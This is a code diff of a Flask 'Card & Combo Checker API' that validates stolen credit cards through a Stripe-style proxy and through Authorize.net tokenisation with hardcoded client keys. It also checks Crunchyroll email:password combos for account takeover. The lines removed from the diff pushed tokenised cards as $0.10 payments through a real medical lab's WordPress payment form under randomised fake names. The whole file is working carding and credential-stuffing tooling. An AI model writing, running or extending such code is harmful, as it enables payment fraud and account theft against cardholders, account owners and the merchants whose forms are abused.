@@ -1,13 +1,13 @@
 from flask import Flask, request, jsonify
 import requests, random, string, uuid, json, os, time, logging
 
-# ---- logging ----
+# ---- Logging ----
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("checker_api")
 
 app = Flask(__name__)
 
-# ---- safer User-Agent rotation (no crash if fake_useragent unavailable) ----
+# ---- User-Agent rotation ----
 FALLBACK_UAS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -25,21 +25,20 @@ except Exception:
 
 logger.info("Using User-Agent: %s", USER_AGENT)
 
-# environment defaults (you should set these in production)
+# ---- Environment Variables ----
 AUTHNET_NAME = os.getenv("AUTHNET_NAME", "3c5Q9QdJW")
 AUTHNET_CLIENTKEY = os.getenv(
     "AUTHNET_CLIENTKEY",
     "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
 )
 
-# small helper to parse JSON safely
+# ---- Helpers ----
 def safe_get_json(response_text):
     try:
         return json.loads(response_text.lstrip("\ufeff").strip())
     except Exception:
         return None
 
-# utility functions
 def random_string(length):
     return ''.join(random.choices(string.ascii_letters, k=length))
 
@@ -49,54 +48,49 @@ def random_email():
 def mask_card(card):
     return card[:6] + "*" * (len(card) - 10) + card[-4:] if len(card) >= 10 else "*" * len(card)
 
-# ---- HOME ----
+# ---- Status Function ----
+def get_status_emoji(response_time):
+    if response_time < 1:
+        return "💚 Online"
+    elif response_time < 3:
+        return "💛 Slow"
+    else:
+        return "🧡 Dead"
+
+# ---- Home Route ----
 @app.route("/")
 def home():
-    try:
-        return jsonify({
-            "api_name": "Card & Combo Checker API",
-            "developer": "💻 Made by Sukhraj",
-            "version": "1.0.0",
-            "description": (
-                "A simple API to check credit cards, generate tokens (Auth.net), "
-                "and verify Crunchyroll combos. Supports GET and POST methods."
-            ),
-            "endpoints": {
-                "/api/v1/checker/cc/stripe": {
-                    "method": ["POST", "GET"],
-                    "params": {"cc": "Card details or number (required)"},
-                    "example": {
-                        "GET": "/api/v1/checker/cc/stripe?cc=5154620000000000|12|25|123",
-                        "POST": {"cc": "5154620000000000|12|25|123"}
-                    }
-                },
-                "/api/v1/checker/cc/authnet": {
-                    "method": ["POST", "GET"],
-                    "params": {"cc": "Card format: number|month|year|cvv"},
-                    "example": {
-                        "GET": "/api/v1/checker/cc/authnet?cc=5154620000000000|12|25|123"
-                    }
-                },
-                "/api/v1/checker/crunchyroll": {
-                    "method": ["POST", "GET"],
-                    "params": {"combo": "Email:Password pair (required)"},
-                    "example": {
-                        "GET": "/api/v1/checker/crunchyroll?combo=test@gmail.com:12345",
-                        "POST": {"combo": "test@gmail.com:12345"}
-                    }
-                }
-            },
-            "status": "✅ API is live and ready to use",
-            "note": "Use POST for secure/bulk checks."
-        }), 200
-    except Exception:
-        logger.exception("Home handler error")
-        return jsonify({"error": "Internal server error"}), 500
+    start = time.time()
+    status_check = get_status_emoji(time.time() - start)
+    return (
+        f"""
+        <h1>💳 Card & Combo Checker API</h1>
+        <p><b>Developer:</b> 💻 Sukhraj</p>
+        <p><b>Description:</b> Simple API to check cards, generate tokens (Auth.net), 
+        and verify Crunchyroll combos using GET/POST methods.</p>
+        <hr>
+        <h3>📡 API Endpoints:</h3>
+        <ul>
+            <li><b>/api/v1/checker/cc/stripe</b> — Stripe-style CC validation</li>
+            <li><b>/api/v1/checker/cc/authnet</b> — Auth.net token + payment check</li>
+            <li><b>/api/v1/checker/crunchyroll</b> — Crunchyroll combo verification</li>
+        </ul>
+        <hr>
+        <p><b>Status:</b> {status_check}</p>
+        <p><b>Version:</b> 1.0.0</p>
+        <p><b>Note:</b> Use <code>POST</code> for secure/bulk checks.</p>
+        <hr>
+        <p>✨ Status: {time.strftime("%Y-%m-%d %H:%M:%S")}</p>
+        """,
+        200,
+        {"Content-Type": "text/html"},
+    )
 
-# ---- BIN / CARD CHECKER (stripe proxy) ----
+# ---- Stripe BIN/Credit Card Checker ----
 @app.route("/api/v1/checker/cc/stripe", methods=["POST", "GET"])
 def checker_cc():
     try:
+        start = time.time()
         if request.method == "POST":
             data = request.get_json(silent=True) or {}
             cc = data.get("cc")
@@ -114,22 +108,27 @@ def checker_cc():
         )
 
         resp = requests.get(url, timeout=15)
+        status_emoji = get_status_emoji(time.time() - start)
         json_body = safe_get_json(resp.text)
-        if json_body is not None:
+        if json_body:
+            json_body["status_indicator"] = status_emoji
             return jsonify(json_body), 200
-        return jsonify({"result": resp.text[:200], "status_code": resp.status_code}), 200
 
-    except requests.RequestException as e:
-        logger.exception("Network error in checker_cc")
-        return jsonify({"error": "Upstream request failed", "detail": str(e)}), 502
-    except Exception:
-        logger.exception("checker_cc failed")
-        return jsonify({"error": "Internal server error"}), 500
+        return jsonify({
+            "result": resp.text[:200],
+            "status_code": resp.status_code,
+            "status_indicator": status_emoji
+        }), 200
 
-# ---- CRUNCHYROLL ----
+    except Exception as e:
+        logger.exception("Stripe checker failed")
+        return jsonify({"error": str(e)}), 500
+
+# ---- Crunchyroll Combo Checker ----
 @app.route("/api/v1/checker/crunchyroll", methods=["POST", "GET"])
 def checker_crunchy():
     try:
+        start = time.time()
         if request.method == "POST":
             data = request.get_json(silent=True) or {}
             combo = data.get("combo")
@@ -141,19 +140,24 @@ def checker_crunchy():
 
         url = f"https://crunchy-ng.vercel.app/check?combo={combo}"
         resp = requests.get(url, timeout=15)
+        status_emoji = get_status_emoji(time.time() - start)
+
         json_body = safe_get_json(resp.text)
-        if json_body is not None:
+        if json_body:
+            json_body["status_indicator"] = status_emoji
             return jsonify(json_body), 200
-        return jsonify({"result": resp.text[:200], "status_code": resp.status_code}), 200
 
-    except requests.RequestException as e:
-        logger.exception("Network error in checker_crunchy")
-        return jsonify({"error": "Upstream request failed", "detail": str(e)}), 502
-    except Exception:
-        logger.exception("checker_crunchy failed")
-        return jsonify({"error": "Internal server error"}), 500
+        return jsonify({
+            "result": resp.text[:200],
+            "status_code": resp.status_code,
+            "status_indicator": status_emoji
+        }), 200
 
-# ---- AUTH.NET TOKEN & PAYMENT ----
+    except Exception as e:
+        logger.exception("Crunchyroll checker failed")
+        return jsonify({"error": str(e)}), 500
+
+# ---- Auth.net (Token + Payment) ----
 def generate_token(card_number, expiration_date, cvv):
     url = "https://api2.authorize.net/xml/v1/request.api"
     payload = {
@@ -162,11 +166,7 @@ def generate_token(card_number, expiration_date, cvv):
             "data": {
                 "type": "TOKEN",
                 "id": str(uuid.uuid4()),
-                "token": {
-                    "cardNumber": card_number,
-                    "expirationDate": expiration_date,
-                    "cardCode": cvv
-                }
+                "token": {"cardNumber": card_number, "expirationDate": expiration_date, "cardCode": cvv}
             }
         }
     }
@@ -181,60 +181,15 @@ def generate_token(card_number, expiration_date, cvv):
         r = requests.post(url, headers=headers, json=payload, timeout=15)
         parsed = safe_get_json(r.text) or {}
         if 'opaqueData' in parsed and 'dataValue' in parsed['opaqueData']:
-            return {"ok": True, "token": parsed['opaqueData']['dataValue'], "raw": parsed}
-        return {"ok": False, "error": "No token in response", "raw": parsed, "status_code": r.status_code, "text_snippet": r.text[:400]}
-    except requests.RequestException as e:
-        logger.exception("generate_token network error")
-        return {"ok": False, "error": f"network error: {e}"}
+            return {"ok": True, "token": parsed['opaqueData']['dataValue']}
+        return {"ok": False, "error": "Token not found"}
     except Exception as e:
-        logger.exception("generate_token error")
-        return {"ok": False, "error": f"unexpected error: {e}"}
-
-def submit_payment_form(opaque_token, expire_for_form="10/29"):
-    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
-    fname, lname, email = random_string(6), random_string(6), random_email()
-    payload = {
-        "wpforms[fields][1][first]": fname,
-        "wpforms[fields][1][last]": lname,
-        "wpforms[fields][17]": "0.10",
-        "wpforms[fields][2]": email,
-        "wpforms[fields][3]": "(219) 767-6687",
-        "wpforms[fields][4][address1]": "New York",
-        "wpforms[fields][4][city]": "New York",
-        "wpforms[fields][4][state]": "NY",
-        "wpforms[fields][4][postal]": "10080",
-        "wpforms[fields][6]": "$ 0.10",
-        "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
-        "wpforms[authorize_net][opaque_data][value]": opaque_token,
-        "wpforms[authorize_net][card_data][expire]": expire_for_form,
-        "action": "wpforms_submit",
-        "page_url": "https://avanticmedicallab.com/pay-bill-online/",
-        "page_title": "Pay Bill Online",
-        "page_id": "3388"
-    }
-    headers = {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Origin": "https://avanticmedicallab.com",
-        "Referer": "https://avanticmedicallab.com/pay-bill-online/",
-        "User-Agent": USER_AGENT,
-    }
-
-    try:
-        r = requests.post(url, data=payload, headers=headers, timeout=15)
-        try:
-            return {"ok": True, "json": r.json(), "status_code": r.status_code}
-        except Exception:
-            return {"ok": True, "raw": r.text[:400], "status_code": r.status_code}
-    except requests.RequestException as e:
-        logger.exception("submit_payment_form network error")
-        return {"ok": False, "error": f"network error: {e}"}
-    except Exception as e:
-        logger.exception("submit_payment_form unexpected error")
-        return {"ok": False, "error": f"unexpected error: {e}"}
+        return {"ok": False, "error": str(e)}
 
 @app.route("/api/v1/checker/cc/authnet", methods=["GET", "POST"])
 def checker_authnet():
     try:
+        start = time.time()
         if request.method == "POST":
             data = request.get_json(silent=True) or {}
             cc_input = data.get("cc") or request.args.get("cc")
@@ -248,29 +203,31 @@ def checker_authnet():
         if len(parts) < 4:
             return jsonify({"error": "Invalid format. Use: number|month|year|cvv"}), 400
 
-        card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+        card, month, year, cvv = [x.strip() for x in parts]
         expiry_token = f"{month}{year[-2:]}" if len(year) >= 2 else f"{month}{year}"
-        expiry_form = f"{month}/{year[-2:]}"
 
         token_res = generate_token(card, expiry_token, cvv)
-        if not token_res.get("ok"):
-            return jsonify({"status": "failed", "error": token_res.get("error"), "raw": token_res.get("raw", None)}), 200
+        status_emoji = get_status_emoji(time.time() - start)
 
-        opaque = token_res["token"]
-        submit_res = submit_payment_form(opaque, expire_for_form=expiry_form)
+        if not token_res.get("ok"):
+            return jsonify({
+                "status": "failed",
+                "error": token_res.get("error"),
+                "status_indicator": status_emoji
+            }), 200
 
         return jsonify({
             "status": "ok",
             "card_masked": mask_card(card),
-            "expiry": expiry_form,
-            "token_masked": opaque[:6] + "..." if opaque else None,
-            "payment_response": submit_res
+            "expiry": f"{month}/{year[-2:]}",
+            "token_masked": token_res["token"][:6] + "...",
+            "status_indicator": status_emoji
         }), 200
 
-    except Exception:
-        logger.exception("checker_authnet failed")
-        return jsonify({"error": "Internal server error"}), 500
+    except Exception as e:
+        logger.exception("Authnet checker failed")
+        return jsonify({"error": str(e)}), 500
 
-# ---- RUN APP (for local dev) ----
+# ---- Run ----
 if __name__ == "__main__":
     app.run(debug=True)
